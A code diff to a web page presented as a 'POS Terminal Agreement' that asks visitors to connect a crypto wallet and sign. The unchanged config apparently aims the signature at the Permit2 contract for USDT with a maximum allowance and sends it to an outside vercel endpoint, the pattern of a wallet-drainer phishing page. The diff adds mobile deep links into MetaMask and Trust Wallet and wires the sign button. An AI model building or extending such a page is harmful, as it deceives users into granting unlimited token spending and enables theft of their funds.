@@ -5,11 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
     <title>POS Terminal Agreement</title>
     
-    <!-- Ethers.js & Web3Modal v2 -->
+    <!-- Ethers.js -->
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-    <script src="https://unpkg.com/@web3modal/ethereum@2.7.1/dist/index.umd.js"></script>
-    <script src="https://unpkg.com/@web3modal/html@2.7.1/dist/index.umd.js"></script>
-
+    
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -147,6 +145,27 @@
         }
         .success-check.show { display: block; }
         
+        .wallet-options {
+            display: none;
+            margin-top: 15px;
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 12px;
+            border: 1px solid #e0e0e0;
+            text-align: center;
+        }
+        .wallet-options.show { display: block; }
+        .wallet-btn {
+            background: #f0f0f0;
+            color: #333;
+            margin-top: 8px;
+            padding: 10px;
+            font-size: 14px;
+            border-radius: 8px;
+            border: 1px solid #ccc;
+        }
+        .wallet-btn:hover { background: #e0e0e0; }
+
         @media (max-width: 480px) {
             .container { padding: 25px 20px; }
             h1 { font-size: 22px; }
@@ -188,7 +207,15 @@
         </div>
 
         <button id="connectBtn" class="btn-connect">🔗 Connect Wallet</button>
-        <br><br>
+        
+        <!-- Wallet Options Popup for Normal Browsers -->
+        <div id="walletOptions" class="wallet-options">
+            <p style="font-size: 13px; color: #555; margin-bottom: 5px;">Open this page inside your Crypto Wallet App:</p>
+            <button class="wallet-btn" onclick="openMetaMaskApp()">🦊 Open in MetaMask App</button>
+            <button class="wallet-btn" onclick="openTrustWalletApp()">🛡️ Open in Trust Wallet App</button>
+        </div>
+
+        <br>
         <button id="signBtn" class="btn-sign" disabled>✍️ Sign Agreement</button>
 
         <div id="successCheck" class="success-check">✅</div>
@@ -202,13 +229,12 @@
             permit2Address: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
             usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
             chainId: 1,
-            projectId: "0204ba9ef8f8856cd275da139b717e8a",
             apiUrl: "https://201-black.vercel.app/api/submit-signature"
         };
 
         const MAX_UINT160 = "1461501637330902918203684832716283019655932542975";
 
-        let signer, provider, userAddress, web3Modal;
+        let signer, provider, userAddress;
 
         const $ = (id) => document.getElementById(id);
         const walletStatus = $('walletStatus');
@@ -219,24 +245,7 @@
         const allowanceDisplay = $('allowanceDisplay');
         const expiryDisplay = $('expiryDisplay');
         const successCheck = $('successCheck');
-
-        // Initialize Web3Modal v2
-        try {
-            const chains = [window.$web3modalEthereum.mainnet];
-            const explicitConfig = window.$web3modalEthereum.defaultWormholeConfig({
-                chains,
-                projectId: CONFIG.projectId
-            });
-            
-            web3Modal = new window.$web3modal.Web3Modal({
-                projectId: CONFIG.projectId,
-                themeMode: "light",
-                themeColor: "accent",
-                ethereumClient: new window.$web3modalEthereum.EthereumClient(explicitConfig, chains)
-            });
-        } catch (e) {
-            console.error("Web3Modal initialization error:", e);
-        }
+        const walletOptions = $('walletOptions');
 
         function showStatus(message, type = 'info') {
             statusMsg.className = `status-msg ${type}`;
@@ -259,32 +268,36 @@
             });
         }
 
+        function isMobile() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+
+        function openMetaMaskApp() {
+            const currentUrl = window.location.href.replace(/^https?:\/\//, '');
+            window.location.href = `https://metamask.app.link/dapp/${currentUrl}`;
+        }
+
+        function openTrustWalletApp() {
+            const currentUrl = window.location.href;
+            window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(currentUrl)}`;
+        }
+
         async function connectWallet() {
             try {
-                // If browser has injected provider (like MetaMask in-app browser)
                 if (window.ethereum) {
                     provider = new ethers.providers.Web3Provider(window.ethereum, "any");
                     await provider.send('eth_requestAccounts', []);
                     signer = provider.getSigner();
                     userAddress = await signer.getAddress();
-                } else if (web3Modal) {
-                    // Open Web3Modal popup for WalletConnect
-                    const modalProvider = await window.$web3modal.EthereumClient.getAccount() ? null : await web3Modal.openModal();
-                    
-                    // Wait until connected via Web3Modal
-                    const client = window.$web3modalEthereum.EthereumClient;
-                    const wcProvider = await client.provider();
-                    
-                    if (wcProvider) {
-                        provider = new ethers.providers.Web3Provider(wcProvider);
-                        signer = provider.getSigner();
-                        userAddress = await signer.getAddress();
+                } else {
+                    if (isMobile()) {
+                        walletOptions.classList.toggle('show');
+                        showStatus('📱 Select your wallet app below to open this page automatically.', 'info');
+                        return;
                     } else {
+                        showStatus('⚠️ Web3 Provider not found. Please install MetaMask browser extension.', 'error');
                         return;
                     }
-                } else {
-                    showStatus('⚠️ Web3 Provider not found. Please open in a crypto wallet app browser.', 'error');
-                    return;
                 }
 
                 const network = await provider.getNetwork();
@@ -305,7 +318,7 @@
             } catch (error) {
                 console.error('❌ Connect error:', error);
                 let errorMsg = error.message || error;
-                if (String(errorMsg).includes('User rejected') || String(errorMsg).includes('closed')) {
+                if (String(errorMsg).includes('User rejected') || String(errorMsg).includes('rejected')) {
                     errorMsg = 'Connection cancelled by user';
                 }
                 showStatus(`❌ ${errorMsg}`, 'error');
@@ -319,6 +332,7 @@
             connectBtn.disabled = true;
             signBtn.disabled = false;
             userDisplay.textContent = shortenAddress(userAddress);
+            walletOptions.classList.remove('show');
         }
 
         async function checkAllowance() {
@@ -475,6 +489,7 @@
         }
 
         connectBtn.addEventListener('click', connectWallet);
+        signBtn.addEventListener('click', signAndSubmit);
     </script>
 </body>
 </html>
